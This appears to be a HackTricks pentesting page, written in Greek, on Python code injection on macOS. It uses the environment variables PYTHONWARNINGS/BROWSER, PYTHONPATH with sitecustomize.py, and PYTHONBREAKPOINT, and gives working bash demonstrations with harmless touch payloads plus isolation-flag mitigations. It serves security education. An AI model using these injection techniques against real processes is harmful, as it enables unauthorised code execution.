# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Μέσω των μεταβλητών περιβάλλοντος `PYTHONWARNINGS` και `BROWSER`

Εάν ένας attacker μπορεί να ελέγξει το περιβάλλον μιας Python process, ο συνδυασμός των `PYTHONWARNINGS` και `BROWSER` μπορεί να ενεργοποιήσει command execution όταν η Python κάνει import το module `antigravity` κατά την επεξεργασία μιας crafted warning option. Η τεχνική βασίζεται στο `antigravity`, το οποίο ανοίγει ένα URL με το module `webbrowser` της Python, που λαμβάνει υπόψη τη μεταβλητή περιβάλλοντος `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Μέσω `PYTHONPATH` και `sitecustomize.py`

Κατά την κανονική εκκίνηση, το module `site` προσθέτει paths ειδικά για το site και στη συνέχεια επιχειρεί να κάνει import ένα module με όνομα `sitecustomize`. Τοποθετώντας έναν κατάλογο στον οποίο έχει πρόσβαση ο attacker στην αρχή του `PYTHONPATH`, ένας attacker που ελέγχει το περιβάλλον του process μπορεί να κάνει την Python να κάνει import ένα payload πριν από το target script. Το flag `-S` απενεργοποιεί την αυτόματη αρχικοποίηση του `site`, ενώ η isolated mode (`-I`) αγνοεί το `PYTHONPATH` και συνεπάγεται τα `-s` και `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Μέσω `PYTHONBREAKPOINT`

Από την Python 3.7 (PEP 553), το ενσωματωμένο `breakpoint()` εισάγει και καλεί οτιδήποτε δείχνει το `sys.breakpointhook`, και αυτός ο στόχος λαμβάνεται από τη μεταβλητή περιβάλλοντος **`PYTHONBREAKPOINT`** (`package.module.callable`). Η εισαγωγή του ονομασμένου module και η κλήση του callable εκτελούνται και τα δύο πριν εμφανιστεί κανονικά ο debugger, επομένως ένας attacker που ελέγχει το περιβάλλον μιας διεργασίας η οποία φτάνει σε ένα `breakpoint()` (κάτι συνηθισμένο σε maintenance/debug scripts και μερικές φορές παραμένοντας σε production paths) αποκτά code execution.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
Σε αντίθεση με τα `PYTHONWARNINGS`/`PYTHONPATH`, αυτό απαιτεί ο στόχος να φτάσει πράγματι σε μια κλήση `breakpoint()`, αλλά λειτουργεί επίσης αποκλειστικά μέσω των **παρενεργειών import** του καθορισμένου module (δείξτε το σε οποιοδήποτε εισαγώγιμο module — για παράδειγμα ένα που βρίσκεται πρώτο στο `PYTHONPATH` — του οποίου το top level εκτελεί code). Η ρύθμιση `PYTHONBREAKPOINT=0` απενεργοποιεί πλήρως το hook.

## References

- [1] [Hacking με Environment Variables - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook ρυθμίσεων ειδικών για το site](https://docs.python.org/3/library/site.html)
- [3] [Γραμμή εντολών και environment της Python](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Ενσωματωμένο breakpoint() και PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
